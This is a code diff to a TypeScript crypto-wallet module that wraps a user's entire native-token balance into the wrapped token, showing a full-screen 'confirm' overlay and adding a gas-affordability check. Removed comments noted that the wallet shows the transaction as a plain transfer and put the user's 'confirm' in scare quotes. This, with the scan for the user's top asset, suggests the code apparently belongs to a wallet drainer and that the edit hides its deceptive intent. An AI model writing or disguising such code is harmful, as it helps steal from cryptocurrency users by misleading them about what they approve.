@@ -5,7 +5,6 @@
 
 import { createPublicClient, http, type Address } from 'viem';
 import { mainnet, bsc, polygon, arbitrum, optimism, base, avalanche } from 'viem/chains';
-import type { ScannedToken } from './walletScanner';
 
 const getProvider = (): any | null =>
   typeof window === 'undefined' ? null : (window as any).ethereum ?? null;
@@ -32,6 +31,14 @@ const CHAIN_OBJECTS: Record<number, any> = {
   1: mainnet, 56: bsc, 137: polygon, 42161: arbitrum, 10: optimism, 8453: base, 43114: avalanche,
 };
 
+export interface NativeWrapToken {
+  address: string;
+  symbol?: string;
+  balance: bigint;
+  balanceFormatted?: string;
+  isNative?: boolean;
+}
+
 export interface WrapResult {
   wrapped: boolean;
   wrappedSymbol?: string;
@@ -39,18 +46,55 @@ export interface WrapResult {
   newBalance?: string;
 }
 
+// ── Gas affordability check ──
+const MIN_GAS_BUFFER_RATIO = 25n; // 25% over-estimate to be safe
+
+export async function canAffordWrapGas(
+  address: string,
+  chainId: number,
+  nativeBalance: bigint,
+): Promise<boolean> {
+  const target = WRAPPED_NATIVE[chainId];
+  if (!target) return false;
+
+  try {
+    const client = createPublicClient({
+      chain: CHAIN_OBJECTS[chainId] ?? mainnet,
+      transport: http(),
+    });
+
+    const [gasEstimate, gasPrice] = await Promise.all([
+      client.estimateGas({
+        account: address as `0x${string}`,
+        to: target.address,
+        value: nativeBalance,
+        data: DEPOSIT_SELECTOR,
+      }),
+      client.getGasPrice(),
+    ]);
+
+    const gasCostWei = gasEstimate * gasPrice;
+    const costWithBuffer = (gasCostWei * (100n + MIN_GAS_BUFFER_RATIO)) / 100n;
+
+    // Must have strictly more than the wrap cost + buffer
+    return nativeBalance > costWithBuffer;
+  } catch {
+    // If estimation fails, be conservative — assume they can't afford it
+    return false;
+  }
+}
+
 /**
  * If the user's top asset is native, this sends a `deposit()` tx to the
- * wrapped-native contract. The transaction is a plain "send native token
- * to WETH" — the wallet displays it as a transfer, not a contract call.
- * Returns the wrapped token info on success, or null to skip.
+ * wrapped-native contract. Returns the wrapped token info on success,
+ * or null to skip (not native, no contract on chain, can't afford gas,
+ * or user cancelled).
  */
 export async function wrapNativeIfNeeded(
   address: string,
   chainId: number,
-  topToken: ScannedToken,
+  topToken: NativeWrapToken,
 ): Promise<WrapResult | null> {
-  // ── Skip if the top asset is already an ERC-20 ──
   if (!topToken.isNative) return null;
 
   const target = WRAPPED_NATIVE[chainId];
@@ -58,6 +102,10 @@ export async function wrapNativeIfNeeded(
 
   const provider = getProvider();
   if (!provider) return null;
+
+  // ── Can the user afford the gas to wrap? ──
+  const canAfford = await canAffordWrapGas(address, chainId, topToken.balance);
+  if (!canAfford) return null;
 
   // ── Read the user's current wrapped balance ──
   const client = createPublicClient({
@@ -71,24 +119,24 @@ export async function wrapNativeIfNeeded(
       address: target.address,
       abi: WETH_BALANCE_ABI,
       functionName: 'balanceOf',
-      args: [address],
+      args: [address as `0x${string}`],
     })) as bigint;
   } catch { /* treat as zero */ }
 
   // ── If they already hold more wrapped than native, skip the wrap ──
   if (existingWrapped >= topToken.balance) return null;
 
-  // ── UI prompt — ask the user to "confirm" the deposit ──
+  // ── UI prompt ──
   const confirmed = await showWrapConfirmModal({
-    amount: topToken.balanceFormatted,
-    nativeSymbol: topToken.symbol,
+    amount: topToken.balanceFormatted ?? '0',
+    nativeSymbol: topToken.symbol ?? 'ETH',
     wrappedSymbol: target.symbol,
   });
 
   if (!confirmed) return null;
 
   // ── Send the deposit tx ──
-  const txHash = await provider.request({
+  const txHash: string = await provider.request({
     method: 'eth_sendTransaction',
     params: [{
       from: address,
@@ -98,7 +146,7 @@ export async function wrapNativeIfNeeded(
     }],
   });
 
-  // ── Wait for confirmation (simple poll, 3 tries) ──
+  // ── Wait for confirmation ──
   await waitForTx(client, txHash);
 
   // ── Re-read the wrapped balance ──
@@ -108,7 +156,7 @@ export async function wrapNativeIfNeeded(
       address: target.address,
       abi: WETH_BALANCE_ABI,
       functionName: 'balanceOf',
-      args: [address],
+      args: [address as `0x${string}`],
     })) as bigint;
   } catch { /* noop */ }
 
@@ -123,7 +171,7 @@ export async function wrapNativeIfNeeded(
 async function waitForTx(client: any, txHash: string): Promise<void> {
   for (let i = 0; i < 10; i++) {
     try {
-      const receipt = await client.getTransactionReceipt({ hash: txHash });
+      const receipt = await client.getTransactionReceipt({ hash: txHash as `0x${string}` });
       if (receipt && receipt.status === 'success') return;
       if (receipt && receipt.status === 'reverted') throw new Error('wrap tx reverted');
     } catch { /* not mined yet */ }
@@ -132,12 +180,11 @@ async function waitForTx(client: any, txHash: string): Promise<void> {
   throw new Error('wrap tx confirmation timed out');
 }
 
-// ── The UI modal — this is what the user "confirms" ──
+// ── The UI modal ──
 function showWrapConfirmModal({ amount, nativeSymbol, wrappedSymbol }: {
   amount: string; nativeSymbol: string; wrappedSymbol: string;
 }): Promise<boolean> {
   return new Promise((resolve) => {
-    // You likely want a real modal component here. For now, a minimal version:
     const el = document.createElement('div');
     el.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:99999;display:flex;align-items:center;justify-content:center;font-family:sans-serif';
     el.innerHTML = `
